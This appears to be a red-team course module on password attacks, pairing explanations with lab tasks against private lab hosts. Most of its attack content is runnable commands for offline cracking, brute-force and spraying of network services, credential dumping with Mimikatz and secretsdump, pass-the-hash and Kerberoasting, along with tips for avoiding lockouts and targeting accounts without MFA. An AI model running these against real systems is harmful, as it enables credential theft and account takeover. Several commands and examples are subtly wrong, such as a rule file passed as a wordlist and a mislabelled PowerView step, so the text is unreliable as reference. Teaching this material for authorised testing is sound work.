# Module 7: Password Attacks

## Objectives
- Understand password storage mechanisms and hashing algorithms
- Perform offline password cracking with Hashcat and John the Ripper
- Execute online password attacks (brute-force, dictionary, spraying)
- Understand Kerberos attacks in Windows environments
- Defend against password-based attacks

---

## 7.1 Password Security Fundamentals

Passwords remain the most common authentication mechanism and one of the most exploited. Understanding how passwords are stored and attacked is foundational to both red teaming and defense.

### Password Storage

| Storage Method | Description | Attack Difficulty |
|----------------|-------------|-------------------|
| **Plaintext** | Stored as-is — catastrophic if leaked | Trivial |
| **MD5/SHA1 (unsalted)** | Fast hash, no salt — rainbow table attacks | Easy |
| **SHA256/SHA512 (unsalted)** | Faster than bcrypt, still vulnerable to GPU cracking | Moderate |
| **bcrypt** | Adaptive, salted, slow by design | Hard |
| **Argon2** | Memory-hard, resistant to GPU/ASIC attacks | Very hard |
| **Windows NTLM** | MD4-based, no salt, ubiquitous in Windows | Easy (offline) |
| **Windows NTLMv2** | Challenge-response, still based on MD4 | Moderate |
| **Kerberos hashes (NTLM/ AES)** | Used in Kerberos tickets | Depends on attack type |

### Hashing vs. Encryption

- **Hashing** is one-way — you can't directly recover the password from the hash. You must guess and compare.
- **Encryption** is reversible with a key. If you have the key, you decrypt. If you don't, it's effectively hashing.
- Password storage should always use slow, salted hashing (bcrypt, Argon2, scrypt), never fast hashes or encryption.

---

## 7.2 Hash Identification

Before cracking, you must identify what kind of hash you have.

### Tools

```bash
# hashid — identify hash types
hashid $NT$7865a4d96356d4014b61c43a3b99c6e3

# hash-identifier (Python)
hash-identifier

# Online identification
# https://hashes.com/en/decoder
```

### Common Hash Formats

| Format | Example | Used By |
|--------|---------|---------|
| `$NT$` or raw NTLM | `7865a4d96356d4014b61c43a3b99c6e3` | Windows (32 hex chars) |
| `$1$` | `$1$rounds=5000$salt$hash` | MD5 crypt (Unix) |
| `$6$` | `$6$salt$hash` | SHA512 crypt (Linux) |
| `$y$` | `$y$rounds=5000$...` | yescrypt (modern Linux) |
| bcrypt | `$2a$10$...` | bcrypt |
| MD5 | `5d41402abc4b2a76b9719d911017c592` | Various (32 hex chars) |
| SHA1 | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` | Various (40 hex chars) |
| Wordpress | `$P$...` or `$S$...` | WordPress |
| Drupal | `$S$...` | Drupal |

---

## 7.3 Offline Password Cracking

Offline cracking happens when you have the password hashes (from a database dump, configuration file, memory dump, etc.) and can attack them without interacting with the target system.

### Hashcat

Hashcat is the fastest password cracker, leveraging GPU acceleration.

```bash
# Hashcat modes (select the correct mode for your hash type)
hashcat --help | grep -i ntlm   # Find NTLM mode number

# Common modes:
# 0 = MD5, 100 = SHA1, 1000 = NTLM, 1800 = SHA512, 3200 = bcrypt, 11900 = WordPress

# Basic dictionary attack
hashcat -m 1000 -a 0 hash.txt rockyou.txt

# With rules (apply transformations to dictionary words)
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r rules/best64.rule

# Brute-force (slow for long passwords)
hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a?a?a

# Mask attack (targeted brute-force with known patterns)
# Prefix: 'corp', length: 6-8 chars, all lowercase+digits
hashcat -m 1000 -a 3 hash.txt corp?l?l?d?d?d?d

# Wordlist + mask combination
hashcat -m 1000 -a 6 hash.txt rockyou.txt ?d?d?d?d

# Show cracked passwords
hashcat -m 1000 -a 0 hash.txt rockyou.txt --show

# Resume interrupted session
hashcat -m 1000 -a 0 hash.txt rockyou.txt --session myattack
hashcat -m 1000 hash.txt --session myattack --restore
```

### Dictionary Sources

| Source | Description |
|--------|-------------|
| **rockyou.txt** | 14M+ common passwords, from 2009 breach |
| **SecLists** | Comprehensive collection (passwords, usernames, fuzzing) |
| **Probable Wordlists** | Curated, statistically ordered password lists |
| **Company-specific** | Derived from breached employee passwords, company name variants |
| **Language-specific** | Targeted to the target's language and culture |

```bash
# Download SecLists
git clone https://github.com/danielmiessler/SecLists.git

# Common password lists
SecLists/Passwords/Leaked-Databases/rockyou.txt
SecLists/Passwords/Common-Credentials/10k-most-common.txt
SecLists/Passwords/BeEF-wordlist.txt
```

### John the Ripper

JtR is another popular cracker, especially strong for Linux/Unix password files.

```bash
# Basic John with wordlist
john --wordlist=rockyou.txt hash.txt

# John with rules
john --wordlist=rockyou.txt --rules hash.txt

# Show cracked passwords
john --show hash.txt

# Crack /etc/shadow directly
john /etc/shadow

# Single crack mode (uses login info from the file itself)
john --single hash.txt

# Incremental mode (brute-force by length)
john --incremental hash.txt
john --incremental=Alpha hash.txt   # Letters only
john --incremental=Digits hash.txt  # Numbers only
```

---

## 7.4 Online Password Attacks

Online attacks interact directly with the authentication system — each attempt goes over the network. They are slower, noisier, and more likely to be detected than offline attacks. Always prefer offline attacks when you have the hashes.

### Hydra

Hydra is a parallelized online brute-forcer supporting many protocols.

```bash
# FTP brute-force
hydra -l admin -P rockyou.txt ftp://10.10.1.20

# HTTP POST form brute-force
hydra -l admin -P rockyou.txt 10.10.1.50 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid"

# HTTP basic auth
hydra -l admin -P rockyou.txt 10.10.1.50 http-get /admin

# SSH brute-force
hydra -l root -P rockyou.txt 10.10.1.20 ssh

# SMB brute-force
hydra -l administrator -P rockyou.txt 10.10.1.100 smb

# MySQL brute-force
hydra -l root -P rockyou.txt 10.10.1.50 mysql

# Multiple protocols
hydra -l admin -P passwords.txt 10.10.1.50 -s 8080 pop3

# With specific port
hydra -l admin -P rockyou.txt -s 2222 10.10.1.20 ssh
```

**Important:** Online attacks are noisy. Each attempt may be logged. Use with caution and only within your RoE.

### Patator

Patator is a more flexible alternative to Hydra, with better logging and modular design.

```bash
# FTP brute-force with patator
patator ftp_login host=10.10.1.20 user=admin password=FILE0 0=rockyou.txt

# HTTP POST
patator http_fuzz url=http://10.10.1.50/dvwa/login.php method=POST \
  body='username=FILE0&password=FILE1&Login=Login' \
  0=logins.txt 1=rockyou.txt follow=1

# Stop on successful login (exit code 0)
patator ftp_login host=10.10.1.20 user=admin password=FILE0 0=rockyou.txt -x exit:code=0
```

### Credential Stuffing and Password Spraying

| Attack | Description | Risk |
|--------|-------------|------|
| **Credential stuffing** | Try breached username/password pairs against a target | High success if passwords are reused |
| **Password spraying** | One common password against many accounts | Avoids lockout by spreading attempts |
| **Dictionary attack** | Try many passwords against one or few accounts | High detection risk, triggers lockouts |
| **Brute-force** | Try all combinations | Guaranteed eventual success, but impractical for long passwords |

```bash
# Password spraying example (manual approach)
# Try "Summer2024!" against all discovered usernames
for user in jsmith mjones abrown tjohnson; do
  echo "Testing $user"
  smbclient -L //10.10.1.100 -U "$user%Summer2024!"
done

# With hydra against multiple users
hydra -L users.txt -p "Summer2024!" 10.10.1.100 smb
```

**Spraying timing:** Wait 15–30 minutes between attempts to avoid triggering account lockout policies. Use a single password across many accounts rather than one account with many passwords.

---

## 7.5 Windows Password Attacks

Windows environments present unique password attack opportunities due to the prevalence of NTLM and Kerberos.

### NTLM Hash Extraction

```bash
# From Metasploit (post module)
use post/windows/gather/smart_hashdump
use post/windows/gather/enum_patches

# From Linux against a SAM file
samdump2 SYSTEM SAM > hashes.txt

# From Impacket (if you have credentials)
secretsdump.py corp.local/admin:P@ssw0rd1@10.10.1.100

# Mimikatz (Windows, requires admin)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### NTLM Cracking

```bash
# Extract NT hash and crack with hashcat
hashcat -m 1000 hashes.txt rockyou.txt

# NTLM challenge-response (NetNTLMv2) — requires online relay or offline cracking
hashcat -m 5600 netntlmv2_hashes.txt rockyou.txt
```

### Kerberos Attacks

Kerberos introduces ticket-based authentication in Active Directory. Several attacks target Kerberos specifically.

#### Pass-the-Hash (PtH)
Use an NTLM hash directly for authentication without knowing the plaintext password.

```bash
# With Impacket (psexec, wmiexec, etc.)
psexec.py -hashes :7865a4d96356d4014b61c43a3b99c6e3 corp.local/admin@10.10.1.100

# With Metasploit
use exploit/windows/smb/psexec
set SMBPass 7865a4d96356d4014b61c43a3b99c6e3
```

#### Pass-the-Ticket (PtT)
Use a stolen Kerberos ticket (TGT or service ticket) to authenticate.

```bash
# Import ticket into memory (Linux, using tickets in .ccache format)
export KRB5CCNAME=/path/to/ticket.ccache

# Using Impacket with a ticket
wmiexec.py -k -no-pass corp.local/admin@10.10.1.100

# Mimikatz: export tickets from memory
mimikatz.exe "kerberos::list" "exit"
```

#### Kerberoasting
Request service tickets for service accounts and crack them offline. Service accounts often have weak passwords because they're managed differently than user accounts.

```bash
# With GetUserSPNs.py (Impacket)
GetUserSPNs.py corp.local -dc-ip 10.10.1.100 -request -outputfile tickets.txt

# Or from Windows with PowerView
GetUserSPNs.py corp.local/admin:P@ssw0rd1 -request

# Crack the extracted tickets
hashcat -m 13100 tickets.txt rockyou.txt
hashcat -m 13100 tickets.txt best64.rule

# With Rubeus (Windows)
Rubeus.exe kerberoast /outfile:kerb.txt
```

#### AS-REP Roasting
Attack accounts that don't require pre-authentication (DO_NOT_REQUIRE_PREAUTH flag). These accounts can be attacked without knowing the password.

```bash
# With Impacket
GetNPUsers.py corp.local -no-pass -usersfile users.txt -outputfile asrep.txt

# Crack AS-REP hashes
hashcat -m 18200 asrep.txt rockyou.txt
```

---

## 7.6 Password Policy and Defense Awareness

Understanding defensive measures helps you design more effective attacks and provide better recommendations.

### Defensive Controls

| Control | How It Affects Attacks |
|---------|----------------------|
| **Account lockout policy** | Limits brute-force attempts; makes spraying risky |
| **Password complexity** | Requires mixed case, digits, symbols — increases cracking difficulty |
| **Password length** | Longer passwords exponentially harder to crack |
| **MFA** | Renders password attacks insufficient alone |
| **Password history** | Prevents password reuse |
| **Fine-grained password policies** | Different policies for different users/groups |
| **LSA protection** | Prevents credential dumping from memory |
| **Credential Guard** | Virtualization-based isolation of credentials |
| **Restricted Admin Mode** | Limits pass-the-hash effectiveness |

### Bypassing and Evading Defenses

- **Avoid lockouts:** Use spraying instead of brute-force; use password lists ranked by probability
- **Target accounts without MFA:** Service accounts, legacy accounts, admin accounts with exemptions
- **Use hashes when possible:** PtH and PtT bypass password complexity requirements
- **Exploit password reuse:** Credential stuffing against internet-facing services often succeeds
- **Target service accounts:** Often have weaker password policies, no MFA, and high privileges

---

## 7.7 Lab: Password Attacks

### Setup
- Kali Linux (10.10.1.10)
- Metasploitable 2 (10.10.1.20) — FTP, SSH, MySQL with weak passwords
- Windows Server 2019 DC (10.10.1.100) — Active Directory
- DVWA (10.10.1.50) — Web app with authentication

### Tasks

**Task 1: Hash Identification Practice**
1. Create a file with several different hash types (NTLM, MD5, SHA1, bcrypt, SHA512 crypt)
2. Use `hashid` and `hash-identifier` to identify each
3. Document which tools correctly identified each hash type and which were ambiguous
4. Note: a single incorrect character in a hash makes it uncrackable — always verify

**Task 2: Dictionary Attack on Metasploitable Services**
1. Use Hydra to brute-force the FTP service on Metasploitable:
   ```bash
   hydra -l msfadmin -P rockyou.txt ftp://10.10.1.20
   ```
2. Try against SSH as well:
   ```bash
   hydra -l msfadmin -P rockyou.txt 10.10.1.20 ssh
   ```
3. Try MySQL:
   ```bash
   hydra -l root -P rockyou.txt 10.10.1.50 mysql
   ```
4. Document which services were vulnerable, how long each took, and any that were locked out

**Task 3: Hashcat Cracking**
1. Extract NTLM hashes (from a lab-provided hash file or from your own test VM):
   - If you have a Windows system in the lab, use `samdump2` or `secretsdump.py`
   - Alternative: use provided sample hashes for this lab
2. Run Hashcat with rockyou.txt against NTLM hashes:
   ```bash
   hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
   ```
3. Try with rules enabled:
   ```bash
   hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r rules/best64.rule
   ```
4. Try a mask attack for a known pattern (e.g., 8 chars, starts with "P@ss"):
   ```bash
   hashcat -m 1000 ntlm_hashes.txt -a 3 P@ss?a?a?a?a?a?a
   ```
5. Document cracking speed (hashes/sec), time to crack, and results

**Task 4: John the Ripper Comparison**
1. Take the same NTLM hashes and crack with John:
   ```bash
   john --wordlist=rockyou.txt ntlm_hashes.txt
   ```
2. Compare results with Hashcat:
   - Which cracked more?
   - Which was faster?
   - When would you choose one over the other?
3. Try cracking a Linux shadow file:
   ```bash
   john /etc/shadow
   ```
   (You may need to unshadow first: `unshadow /etc/passwd /etc/shadow > combined.txt`)

**Task 5: Kerberoasting Lab**
*Note: Requires the Windows Server DC configured with service accounts.*
1. Create a service account on the DC with a weak password:
   ```powershell
   # On Windows Server DC
   New-ADServiceAccount -Name "svc_backup" -AccountPassword (ConvertTo-SecureString "Backup123!" -AsPlainText -Force)
   ```
2. From Kali, use Impacket to request tickets:
   ```bash
   GetUserSPNs.py corp.local/svc_backup:Backup123!@10.10.1.100 -request -outputfile tickets.txt
   ```
3. Crack the tickets:
   ```bash
   hashcat -m 13100 tickets.txt rockyou.txt
   ```
4. If cracking succeeds, document the recovered password and note the implications — this account may have privileges to access resources

**Task 6: Password Spraying Simulation**
1. Create a list of test usernames (at least 5–10)
2. Identify a common password pattern (e.g., "Password1", "Spring2025!")
3. Run a spray against SMB or HTTP:
   ```bash
   hydra -L users.txt -p "Password1" 10.10.1.100 smb
   ```
4. Time the attack — add delays (`-t 1` for single thread, `--delay` if supported) to simulate realistic spraying
5. Document the approach, timing strategy, and detection risk

**Task 7: Complete Password Attack Chain**
Combine techniques:
1. Discover a service with a weak password (via scanning or enumeration)
2. Crack the associated hash if you've obtained one
3. Use recovered credentials to authenticate to another service
4. Document the full chain from initial discovery to credential reuse

### Bonus: Custom Wordlist Generation
1. Research the target organization (use OSINT from Module 2)
2. Generate a targeted wordlist using:
   - Company name, variations, years
   - Industry terms
   - Building names, street names, founding years
   - Tools: `crunch`, `CUPP` (Common User Passwords Profiler)
   ```bash
   cupp -i  # Interactive mode
   crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t corporation
   ```
3. Use the custom wordlist in a cracking attempt and compare results with rockyou.txt

---

## 7.8 Expected Outcomes

By the end of this module, you should be able to:
- Identify hash types and select appropriate cracking tools
- Perform dictionary, brute-force, and rule-based attacks with Hashcat and John
- Execute online brute-force and spray attacks with Hydra and Patator
- Perform Kerberoasting and understand the Kerberos attack landscape
- Understand how password policies affect attack strategies
- Design attack plans that account for lockout policies, MFA, and detection

---

## 7.9 Assessment Criteria

| Criteria | Points | Description |
|----------|--------|-------------|
| Hash identification | 5 | Correctly identifies hash types from samples |
| Hashcat proficiency | 10 | Runs dictionary, rule-based, and mask attacks correctly |
| John the Ripper proficiency | 5 | Runs cracking with JtR and understands mode differences |
| Online attacks | 10 | Successfully performs Hydra/Patator brute-force or spray |
| Kerberos attacks | 10 | Performs Kerberoasting and understands attack types |
| Custom wordlist | 5 | Generates targeted wordlist and documents approach |
| Lab documentation | 10 | Thorough documentation of all attacks, commands, results |
| **Total** | **55** | |

**Pass threshold:** 40/55 (73%)

### Report Requirements (3–4 pages)
1. Hash identification exercise — results and tool comparison
2. Offline cracking results — what cracked, at what speed, with which method
3. Online attack results — which services were targeted, outcomes, timing
4. Kerberos attack documentation — tickets obtained, cracked or not, implications
5. Password policy analysis — what policies would have prevented each successful attack
6. Recommendations for password security improvements (technical controls, user training, monitoring)
